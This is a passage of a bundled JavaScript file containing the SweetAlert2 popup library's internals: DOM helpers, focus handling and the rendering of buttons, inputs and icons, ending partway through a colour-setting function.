(() => {
  var __create = Object.create;
  var __defProp = Object.defineProperty;
  var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
  var __getOwnPropNames = Object.getOwnPropertyNames;
  var __getProtoOf = Object.getPrototypeOf;
  var __hasOwnProp = Object.prototype.hasOwnProperty;
  var __commonJS = (cb, mod) => function __require() {
    return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
  };
  var __copyProps = (to, from, except, desc) => {
    if (from && typeof from === "object" || typeof from === "function") {
      for (let key of __getOwnPropNames(from))
        if (!__hasOwnProp.call(to, key) && key !== except)
          __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
    }
    return to;
  };
  var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
    // If the importer is in node compatibility mode or this is not an ESM
    // file that has been converted to a CommonJS file using a Babel-
    // compatible transform (i.e. "__esModule" has not been set), then set
    // "default" to the CommonJS "module.exports" for node compatibility.
    isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
    mod
  ));

  // node_modules/sweetalert2/dist/sweetalert2.all.js
  var require_sweetalert2_all = __commonJS({
    "node_modules/sweetalert2/dist/sweetalert2.all.js"(exports, module) {
      (function(global, factory) {
        typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory() : typeof define === "function" && define.amd ? define(factory) : (global = typeof globalThis !== "undefined" ? globalThis : global || self, global.Sweetalert2 = factory());
      })(exports, function() {
        "use strict";
        function _assertClassBrand(e, t2, n) {
          if ("function" == typeof e ? e === t2 : e.has(t2)) return arguments.length < 3 ? t2 : n;
          throw new TypeError("Private element is not present on this object");
        }
        function _checkPrivateRedeclaration(e, t2) {
          if (t2.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
        }
        function _classPrivateFieldGet2(s, a2) {
          return s.get(_assertClassBrand(s, a2));
        }
        function _classPrivateFieldInitSpec(e, t2, a2) {
          _checkPrivateRedeclaration(e, t2), t2.set(e, a2);
        }
        function _classPrivateFieldSet2(s, a2, r2) {
          return s.set(_assertClassBrand(s, a2), r2), r2;
        }
        const RESTORE_FOCUS_TIMEOUT = 100;
        const globalState = {};
        const focusPreviousActiveElement = () => {
          if (globalState.previousActiveElement instanceof HTMLElement) {
            globalState.previousActiveElement.focus();
            globalState.previousActiveElement = null;
          } else if (document.body) {
            document.body.focus();
          }
        };
        const restoreActiveElement = (returnFocus) => {
          return new Promise((resolve) => {
            if (!returnFocus) {
              return resolve();
            }
            const x = window.scrollX;
            const y2 = window.scrollY;
            globalState.restoreFocusTimeout = setTimeout(() => {
              focusPreviousActiveElement();
              resolve();
            }, RESTORE_FOCUS_TIMEOUT);
            window.scrollTo(x, y2);
          });
        };
        const swalPrefix = "swal2-";
        const classNames = ["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"];
        const swalClasses = classNames.reduce(
          (acc, className) => {
            acc[className] = swalPrefix + className;
            return acc;
          },
          /** @type {SwalClasses} */
          {}
        );
        const icons = ["success", "warning", "info", "question", "error"];
        const iconTypes = icons.reduce(
          (acc, icon2) => {
            acc[icon2] = swalPrefix + icon2;
            return acc;
          },
          /** @type {SwalIcons} */
          {}
        );
        const consolePrefix = "SweetAlert2:";
        const capitalizeFirstLetter = (str2) => str2.charAt(0).toUpperCase() + str2.slice(1);
        const warn2 = (message) => {
          console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
        };
        const error2 = (message) => {
          console.error(`${consolePrefix} ${message}`);
        };
        const previousWarnOnceMessages = [];
        const warnOnce = (message) => {
          if (!previousWarnOnceMessages.includes(message)) {
            previousWarnOnceMessages.push(message);
            warn2(message);
          }
        };
        const warnAboutDeprecation = function(deprecatedParam) {
          let useInstead = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
          warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release.${useInstead ? ` Use "${useInstead}" instead.` : ""}`);
        };
        const callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
        const hasToPromiseFn = (arg) => arg && typeof arg.toPromise === "function";
        const asPromise = (arg) => hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
        const isPromise = (arg) => arg && Promise.resolve(arg) === arg;
        const getContainer = () => document.body.querySelector(`.${swalClasses.container}`);
        const elementBySelector = (selectorString) => {
          const container = getContainer();
          return container ? container.querySelector(selectorString) : null;
        };
        const elementByClass = (className) => {
          return elementBySelector(`.${className}`);
        };
        const getPopup = () => elementByClass(swalClasses.popup);
        const getIcon = () => elementByClass(swalClasses.icon);
        const getIconContent = () => elementByClass(swalClasses["icon-content"]);
        const getTitle = () => elementByClass(swalClasses.title);
        const getHtmlContainer = () => elementByClass(swalClasses["html-container"]);
        const getImage = () => elementByClass(swalClasses.image);
        const getProgressSteps = () => elementByClass(swalClasses["progress-steps"]);
        const getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
        const getConfirmButton = () => (
          /** @type {HTMLButtonElement} */
          elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`)
        );
        const getCancelButton = () => (
          /** @type {HTMLButtonElement} */
          elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`)
        );
        const getDenyButton = () => (
          /** @type {HTMLButtonElement} */
          elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`)
        );
        const getInputLabel = () => elementByClass(swalClasses["input-label"]);
        const getLoader = () => elementBySelector(`.${swalClasses.loader}`);
        const getActions = () => elementByClass(swalClasses.actions);
        const getFooter = () => elementByClass(swalClasses.footer);
        const getTimerProgressBar = () => elementByClass(swalClasses["timer-progress-bar"]);
        const getCloseButton = () => elementByClass(swalClasses.close);
        const focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
        const getFocusableElements = () => {
          const popup = getPopup();
          if (!popup) {
            return [];
          }
          const focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
          const focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex).sort((a2, b) => {
            const tabindexA = parseInt(a2.getAttribute("tabindex") || "0");
            const tabindexB = parseInt(b.getAttribute("tabindex") || "0");
            if (tabindexA > tabindexB) {
              return 1;
            } else if (tabindexA < tabindexB) {
              return -1;
            }
            return 0;
          });
          const otherFocusableElements = popup.querySelectorAll(focusable);
          const otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter((el) => el.getAttribute("tabindex") !== "-1");
          return [...new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))].filter((el) => isVisible$1(el));
        };
        const isModal = () => {
          return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
        };
        const isToast = () => {
          const popup = getPopup();
          if (!popup) {
            return false;
          }
          return hasClass(popup, swalClasses.toast);
        };
        const isLoading = () => {
          const popup = getPopup();
          if (!popup) {
            return false;
          }
          return popup.hasAttribute("data-loading");
        };
        const setInnerHtml = (elem, html) => {
          elem.textContent = "";
          if (html) {
            const parser = new DOMParser();
            const parsed = parser.parseFromString(html, `text/html`);
            const head = parsed.querySelector("head");
            if (head) {
              Array.from(head.childNodes).forEach((child) => {
                elem.appendChild(child);
              });
            }
            const body = parsed.querySelector("body");
            if (body) {
              Array.from(body.childNodes).forEach((child) => {
                if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
                  elem.appendChild(child.cloneNode(true));
                } else {
                  elem.appendChild(child);
                }
              });
            }
          }
        };
        const hasClass = (elem, className) => {
          if (!className) {
            return false;
          }
          const classList = className.split(/\s+/);
          for (let i = 0; i < classList.length; i++) {
            if (!elem.classList.contains(classList[i])) {
              return false;
            }
          }
          return true;
        };
        const removeCustomClasses = (elem, params) => {
          Array.from(elem.classList).forEach((className) => {
            if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) {
              elem.classList.remove(className);
            }
          });
        };
        const applyCustomClass = (elem, params, className) => {
          removeCustomClasses(elem, params);
          if (!params.customClass) {
            return;
          }
          const customClass = params.customClass[
            /** @type {keyof SweetAlertCustomClass} */
            className
          ];
          if (!customClass) {
            return;
          }
          if (typeof customClass !== "string" && !customClass.forEach) {
            warn2(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof customClass}"`);
            return;
          }
          addClass(elem, customClass);
        };
        const getInput$1 = (popup, inputClass) => {
          if (!inputClass) {
            return null;
          }
          switch (inputClass) {
            case "select":
            case "textarea":
            case "file":
              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
            case "checkbox":
              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
            case "radio":
              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
            case "range":
              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
            default:
              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
          }
        };
        const focusInput = (input) => {
          input.focus();
          if (input.type !== "file") {
            const val = input.value;
            input.value = "";
            input.value = val;
          }
        };
        const toggleClass = (target, classList, condition) => {
          if (!target || !classList) {
            return;
          }
          if (typeof classList === "string") {
            classList = classList.split(/\s+/).filter(Boolean);
          }
          classList.forEach((className) => {
            if (Array.isArray(target)) {
              target.forEach((elem) => {
                if (condition) {
                  elem.classList.add(className);
                } else {
                  elem.classList.remove(className);
                }
              });
            } else {
              if (condition) {
                target.classList.add(className);
              } else {
                target.classList.remove(className);
              }
            }
          });
        };
        const addClass = (target, classList) => {
          toggleClass(target, classList, true);
        };
        const removeClass = (target, classList) => {
          toggleClass(target, classList, false);
        };
        const getDirectChildByClass = (elem, className) => {
          const children = Array.from(elem.children);
          for (let i = 0; i < children.length; i++) {
            const child = children[i];
            if (child instanceof HTMLElement && hasClass(child, className)) {
              return child;
            }
          }
        };
        const applyNumericalStyle = (elem, property, value) => {
          if (value === `${parseInt(value)}`) {
            value = parseInt(value);
          }
          if (value || parseInt(value) === 0) {
            elem.style.setProperty(property, typeof value === "number" ? `${value}px` : value);
          } else {
            elem.style.removeProperty(property);
          }
        };
        const show = function(elem) {
          let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
          if (!elem) {
            return;
          }
          elem.style.display = display;
        };
        const hide = (elem) => {
          if (!elem) {
            return;
          }
          elem.style.display = "none";
        };
        const showWhenInnerHtmlPresent = function(elem) {
          let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "block";
          if (!elem) {
            return;
          }
          new MutationObserver(() => {
            toggle(elem, elem.innerHTML, display);
          }).observe(elem, {
            childList: true,
            subtree: true
          });
        };
        const setStyle = (parent, selector, property, value) => {
          const el = parent.querySelector(selector);
          if (el) {
            el.style.setProperty(property, value);
          }
        };
        const toggle = function(elem, condition) {
          let display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
          if (condition) {
            show(elem, display);
          } else {
            hide(elem);
          }
        };
        const isVisible$1 = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
        const allButtonsAreHidden = () => !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
        const isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
        const hasCssAnimation = (elem) => {
          const style = window.getComputedStyle(elem);
          const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
          const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
          return animDuration > 0 || transDuration > 0;
        };
        const animateTimerProgressBar = function(timer) {
          let reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
          const timerProgressBar = getTimerProgressBar();
          if (!timerProgressBar) {
            return;
          }
          if (isVisible$1(timerProgressBar)) {
            if (reset) {
              timerProgressBar.style.transition = "none";
              timerProgressBar.style.width = "100%";
            }
            setTimeout(() => {
              timerProgressBar.style.transition = `width ${timer / 1e3}s linear`;
              timerProgressBar.style.width = "0%";
            }, 10);
          }
        };
        const stopTimerProgressBar = () => {
          const timerProgressBar = getTimerProgressBar();
          if (!timerProgressBar) {
            return;
          }
          const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
          timerProgressBar.style.removeProperty("transition");
          timerProgressBar.style.width = "100%";
          const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
          const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
          timerProgressBar.style.width = `${timerProgressBarPercent}%`;
        };
        const isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";
        const sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
   <button type="button" class="${swalClasses.close}"></button>
   <ul class="${swalClasses["progress-steps"]}"></ul>
   <div class="${swalClasses.icon}"></div>
   <img class="${swalClasses.image}" />
   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
   <input class="${swalClasses.input}" id="${swalClasses.input}" />
   <input type="file" class="${swalClasses.file}" />
   <div class="${swalClasses.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${swalClasses.select}" id="${swalClasses.select}"></select>
   <div class="${swalClasses.radio}"></div>
   <label class="${swalClasses.checkbox}">
     <input type="checkbox" id="${swalClasses.checkbox}" />
     <span class="${swalClasses.label}"></span>
   </label>
   <textarea class="${swalClasses.textarea}" id="${swalClasses.textarea}"></textarea>
   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   <div class="${swalClasses.actions}">
     <div class="${swalClasses.loader}"></div>
     <button type="button" class="${swalClasses.confirm}"></button>
     <button type="button" class="${swalClasses.deny}"></button>
     <button type="button" class="${swalClasses.cancel}"></button>
   </div>
   <div class="${swalClasses.footer}"></div>
   <div class="${swalClasses["timer-progress-bar-container"]}">
     <div class="${swalClasses["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
        const resetOldContainer = () => {
          const oldContainer = getContainer();
          if (!oldContainer) {
            return false;
          }
          oldContainer.remove();
          removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
          return true;
        };
        const resetValidationMessage$1 = () => {
          globalState.currentInstance.resetValidationMessage();
        };
        const addInputChangeListeners = () => {
          const popup = getPopup();
          const input = getDirectChildByClass(popup, swalClasses.input);
          const file = getDirectChildByClass(popup, swalClasses.file);
          const range = popup.querySelector(`.${swalClasses.range} input`);
          const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
          const select = getDirectChildByClass(popup, swalClasses.select);
          const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
          const textarea = getDirectChildByClass(popup, swalClasses.textarea);
          input.oninput = resetValidationMessage$1;
          file.onchange = resetValidationMessage$1;
          select.onchange = resetValidationMessage$1;
          checkbox.onchange = resetValidationMessage$1;
          textarea.oninput = resetValidationMessage$1;
          range.oninput = () => {
            resetValidationMessage$1();
            rangeOutput.value = range.value;
          };
          range.onchange = () => {
            resetValidationMessage$1();
            rangeOutput.value = range.value;
          };
        };
        const getTarget3 = (target) => typeof target === "string" ? document.querySelector(target) : target;
        const setupAccessibility = (params) => {
          const popup = getPopup();
          popup.setAttribute("role", params.toast ? "alert" : "dialog");
          popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
          if (!params.toast) {
            popup.setAttribute("aria-modal", "true");
          }
        };
        const setupRTL = (targetElement) => {
          if (window.getComputedStyle(targetElement).direction === "rtl") {
            addClass(getContainer(), swalClasses.rtl);
          }
        };
        const init = (params) => {
          const oldContainerExisted = resetOldContainer();
          if (isNodeEnv()) {
            error2("SweetAlert2 requires document to initialize");
            return;
          }
          const container = document.createElement("div");
          container.className = swalClasses.container;
          if (oldContainerExisted) {
            addClass(container, swalClasses["no-transition"]);
          }
          setInnerHtml(container, sweetHTML);
          const targetElement = getTarget3(params.target);
          targetElement.appendChild(container);
          setupAccessibility(params);
          setupRTL(targetElement);
          addInputChangeListeners();
        };
        const parseHtmlToContainer = (param, target) => {
          if (param instanceof HTMLElement) {
            target.appendChild(param);
          } else if (typeof param === "object") {
            handleObject(param, target);
          } else if (param) {
            setInnerHtml(target, param);
          }
        };
        const handleObject = (param, target) => {
          if (param.jquery) {
            handleJqueryElem(target, param);
          } else {
            setInnerHtml(target, param.toString());
          }
        };
        const handleJqueryElem = (target, elem) => {
          target.textContent = "";
          if (0 in elem) {
            for (let i = 0; i in elem; i++) {
              target.appendChild(elem[i].cloneNode(true));
            }
          } else {
            target.appendChild(elem.cloneNode(true));
          }
        };
        const animationEndEvent = (() => {
          if (isNodeEnv()) {
            return false;
          }
          const testEl = document.createElement("div");
          if (typeof testEl.style.webkitAnimation !== "undefined") {
            return "webkitAnimationEnd";
          }
          if (typeof testEl.style.animation !== "undefined") {
            return "animationend";
          }
          return false;
        })();
        const renderActions = (instance, params) => {
          const actions = getActions();
          const loader = getLoader();
          if (!actions || !loader) {
            return;
          }
          if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
            hide(actions);
          } else {
            show(actions);
          }
          applyCustomClass(actions, params, "actions");
          renderButtons(actions, loader, params);
          setInnerHtml(loader, params.loaderHtml || "");
          applyCustomClass(loader, params, "loader");
        };
        function renderButtons(actions, loader, params) {
          const confirmButton = getConfirmButton();
          const denyButton = getDenyButton();
          const cancelButton = getCancelButton();
          if (!confirmButton || !denyButton || !cancelButton) {
            return;
          }
          renderButton(confirmButton, "confirm", params);
          renderButton(denyButton, "deny", params);
          renderButton(cancelButton, "cancel", params);
          handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
          if (params.reverseButtons) {
            if (params.toast) {
              actions.insertBefore(cancelButton, confirmButton);
              actions.insertBefore(denyButton, confirmButton);
            } else {
              actions.insertBefore(cancelButton, loader);
              actions.insertBefore(denyButton, loader);
              actions.insertBefore(confirmButton, loader);
            }
          }
        }
        function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
          if (!params.buttonsStyling) {
            removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
            return;
          }
          addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
          if (params.confirmButtonColor) {
            confirmButton.style.backgroundColor = params.confirmButtonColor;
            addClass(confirmButton, swalClasses["default-outline"]);
          }
          if (params.denyButtonColor) {
            denyButton.style.backgroundColor = params.denyButtonColor;
            addClass(denyButton, swalClasses["default-outline"]);
          }
          if (params.cancelButtonColor) {
            cancelButton.style.backgroundColor = params.cancelButtonColor;
            addClass(cancelButton, swalClasses["default-outline"]);
          }
        }
        function renderButton(button, buttonType, params) {
          const buttonName = (
            /** @type {'Confirm' | 'Deny' | 'Cancel'} */
            capitalizeFirstLetter(buttonType)
          );
          toggle(button, params[`show${buttonName}Button`], "inline-block");
          setInnerHtml(button, params[`${buttonType}ButtonText`] || "");
          button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`] || "");
          button.className = swalClasses[buttonType];
          applyCustomClass(button, params, `${buttonType}Button`);
        }
        const renderCloseButton = (instance, params) => {
          const closeButton = getCloseButton();
          if (!closeButton) {
            return;
          }
          setInnerHtml(closeButton, params.closeButtonHtml || "");
          applyCustomClass(closeButton, params, "closeButton");
          toggle(closeButton, params.showCloseButton);
          closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
        };
        const renderContainer = (instance, params) => {
          const container = getContainer();
          if (!container) {
            return;
          }
          handleBackdropParam(container, params.backdrop);
          handlePositionParam(container, params.position);
          handleGrowParam(container, params.grow);
          applyCustomClass(container, params, "container");
        };
        function handleBackdropParam(container, backdrop) {
          if (typeof backdrop === "string") {
            container.style.background = backdrop;
          } else if (!backdrop) {
            addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
          }
        }
        function handlePositionParam(container, position) {
          if (!position) {
            return;
          }
          if (position in swalClasses) {
            addClass(container, swalClasses[position]);
          } else {
            warn2('The "position" parameter is not valid, defaulting to "center"');
            addClass(container, swalClasses.center);
          }
        }
        function handleGrowParam(container, grow) {
          if (!grow) {
            return;
          }
          addClass(container, swalClasses[`grow-${grow}`]);
        }
        var privateProps = {
          innerParams: /* @__PURE__ */ new WeakMap(),
          domCache: /* @__PURE__ */ new WeakMap()
        };
        const inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
        const renderInput = (instance, params) => {
          const popup = getPopup();
          if (!popup) {
            return;
          }
          const innerParams = privateProps.innerParams.get(instance);
          const rerender = !innerParams || params.input !== innerParams.input;
          inputClasses.forEach((inputClass) => {
            const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
            if (!inputContainer) {
              return;
            }
            setAttributes(inputClass, params.inputAttributes);
            inputContainer.className = swalClasses[inputClass];
            if (rerender) {
              hide(inputContainer);
            }
          });
          if (params.input) {
            if (rerender) {
              showInput(params);
            }
            setCustomClass(params);
          }
        };
        const showInput = (params) => {
          if (!params.input) {
            return;
          }
          if (!renderInputType[params.input]) {
            error2(`Unexpected type of input! Expected ${Object.keys(renderInputType).join(" | ")}, got "${params.input}"`);
            return;
          }
          const inputContainer = getInputContainer(params.input);
          if (!inputContainer) {
            return;
          }
          const input = renderInputType[params.input](inputContainer, params);
          show(inputContainer);
          if (params.inputAutoFocus) {
            setTimeout(() => {
              focusInput(input);
            });
          }
        };
        const removeAttributes = (input) => {
          for (let i = 0; i < input.attributes.length; i++) {
            const attrName = input.attributes[i].name;
            if (!["id", "type", "value", "style"].includes(attrName)) {
              input.removeAttribute(attrName);
            }
          }
        };
        const setAttributes = (inputClass, inputAttributes) => {
          const popup = getPopup();
          if (!popup) {
            return;
          }
          const input = getInput$1(popup, inputClass);
          if (!input) {
            return;
          }
          removeAttributes(input);
          for (const attr in inputAttributes) {
            input.setAttribute(attr, inputAttributes[attr]);
          }
        };
        const setCustomClass = (params) => {
          if (!params.input) {
            return;
          }
          const inputContainer = getInputContainer(params.input);
          if (inputContainer) {
            applyCustomClass(inputContainer, params, "input");
          }
        };
        const setInputPlaceholder = (input, params) => {
          if (!input.placeholder && params.inputPlaceholder) {
            input.placeholder = params.inputPlaceholder;
          }
        };
        const setInputLabel = (input, prependTo, params) => {
          if (params.inputLabel) {
            const label = document.createElement("label");
            const labelClass = swalClasses["input-label"];
            label.setAttribute("for", input.id);
            label.className = labelClass;
            if (typeof params.customClass === "object") {
              addClass(label, params.customClass.inputLabel);
            }
            label.innerText = params.inputLabel;
            prependTo.insertAdjacentElement("beforebegin", label);
          }
        };
        const getInputContainer = (inputType) => {
          const popup = getPopup();
          if (!popup) {
            return;
          }
          return getDirectChildByClass(popup, swalClasses[
            /** @type {SwalClass} */
            inputType
          ] || swalClasses.input);
        };
        const checkAndSetInputValue = (input, inputValue) => {
          if (["string", "number"].includes(typeof inputValue)) {
            input.value = `${inputValue}`;
          } else if (!isPromise(inputValue)) {
            warn2(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
          }
        };
        const renderInputType = {};
        renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = /** @type {(input: Input | HTMLElement, params: SweetAlertOptions) => Input} */
        (input, params) => {
          checkAndSetInputValue(input, params.inputValue);
          setInputLabel(input, input, params);
          setInputPlaceholder(input, params);
          input.type = params.input;
          return input;
        };
        renderInputType.file = (input, params) => {
          setInputLabel(input, input, params);
          setInputPlaceholder(input, params);
          return input;
        };
        renderInputType.range = (range, params) => {
          const rangeInput = range.querySelector("input");
          const rangeOutput = range.querySelector("output");
          checkAndSetInputValue(rangeInput, params.inputValue);
          rangeInput.type = params.input;
          checkAndSetInputValue(rangeOutput, params.inputValue);
          setInputLabel(rangeInput, range, params);
          return range;
        };
        renderInputType.select = (select, params) => {
          select.textContent = "";
          if (params.inputPlaceholder) {
            const placeholder = document.createElement("option");
            setInnerHtml(placeholder, params.inputPlaceholder);
            placeholder.value = "";
            placeholder.disabled = true;
            placeholder.selected = true;
            select.appendChild(placeholder);
          }
          setInputLabel(select, select, params);
          return select;
        };
        renderInputType.radio = (radio) => {
          radio.textContent = "";
          return radio;
        };
        renderInputType.checkbox = (checkboxContainer, params) => {
          const checkbox = getInput$1(getPopup(), "checkbox");
          checkbox.value = "1";
          checkbox.checked = Boolean(params.inputValue);
          const label = checkboxContainer.querySelector("span");
          setInnerHtml(label, params.inputPlaceholder || params.inputLabel);
          return checkbox;
        };
        renderInputType.textarea = (textarea, params) => {
          checkAndSetInputValue(textarea, params.inputValue);
          setInputPlaceholder(textarea, params);
          setInputLabel(textarea, textarea, params);
          const getMargin = (el) => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
          setTimeout(() => {
            if ("MutationObserver" in window) {
              const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
              const textareaResizeHandler = () => {
                if (!document.body.contains(textarea)) {
                  return;
                }
                const textareaWidth = textarea.offsetWidth + getMargin(textarea);
                if (textareaWidth > initialPopupWidth) {
                  getPopup().style.width = `${textareaWidth}px`;
                } else {
                  applyNumericalStyle(getPopup(), "width", params.width);
                }
              };
              new MutationObserver(textareaResizeHandler).observe(textarea, {
                attributes: true,
                attributeFilter: ["style"]
              });
            }
          });
          return textarea;
        };
        const renderContent = (instance, params) => {
          const htmlContainer = getHtmlContainer();
          if (!htmlContainer) {
            return;
          }
          showWhenInnerHtmlPresent(htmlContainer);
          applyCustomClass(htmlContainer, params, "htmlContainer");
          if (params.html) {
            parseHtmlToContainer(params.html, htmlContainer);
            show(htmlContainer, "block");
          } else if (params.text) {
            htmlContainer.textContent = params.text;
            show(htmlContainer, "block");
          } else {
            hide(htmlContainer);
          }
          renderInput(instance, params);
        };
        const renderFooter = (instance, params) => {
          const footer = getFooter();
          if (!footer) {
            return;
          }
          showWhenInnerHtmlPresent(footer);
          toggle(footer, params.footer, "block");
          if (params.footer) {
            parseHtmlToContainer(params.footer, footer);
          }
          applyCustomClass(footer, params, "footer");
        };
        const renderIcon = (instance, params) => {
          const innerParams = privateProps.innerParams.get(instance);
          const icon2 = getIcon();
          if (!icon2) {
            return;
          }
          if (innerParams && params.icon === innerParams.icon) {
            setContent(icon2, params);
            applyStyles(icon2, params);
            return;
          }
          if (!params.icon && !params.iconHtml) {
            hide(icon2);
            return;
          }
          if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
            error2(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
            hide(icon2);
            return;
          }
          show(icon2);
          setContent(icon2, params);
          applyStyles(icon2, params);
          addClass(icon2, params.showClass && params.showClass.icon);
        };
        const applyStyles = (icon2, params) => {
          for (const [iconType, iconClassName] of Object.entries(iconTypes)) {
            if (params.icon !== iconType) {
              removeClass(icon2, iconClassName);
            }
          }
          addClass(icon2, params.icon && iconTypes[params.icon]);
          setColor(icon2, params);
          adjustSuccessIconBackgroundColor();
          applyCustomClass(icon2, params, "icon");
        };
        const adjustSuccessIconBackgroundColor = () => {
          const popup = getPopup();
          if (!popup) {
            return;
          }
          const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
          const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
          for (let i = 0; i < successIconParts.length; i++) {
            successIconParts[i].style.backgroundColor = popupBackgroundColor;
          }
        };
        const successIconHtml = `
  <div class="swal2-success-circular-line-left"></div>
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
  <div class="swal2-success-circular-line-right"></div>
`;
        const errorIconHtml = `
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`;
        const setContent = (icon2, params) => {
          if (!params.icon && !params.iconHtml) {
            return;
          }
          let oldContent = icon2.innerHTML;
          let newContent = "";
          if (params.iconHtml) {
            newContent = iconContent(params.iconHtml);
          } else if (params.icon === "success") {
            newContent = successIconHtml;
            oldContent = oldContent.replace(/ style=".*?"/g, "");
          } else if (params.icon === "error") {
            newContent = errorIconHtml;
          } else if (params.icon) {
            const defaultIconHtml = {
              question: "?",
              warning: "!",
              info: "i"
            };
            newContent = iconContent(defaultIconHtml[params.icon]);
          }
          if (oldContent.trim() !== newContent.trim()) {
            setInnerHtml(icon2, newContent);
          }
        };
        const setColor = (icon2, params) => {
          if (!params.iconColor) {
            return;
          }
          icon2.style.color = params.iconColor;
          icon2.style.borderColor = params.iconColor;
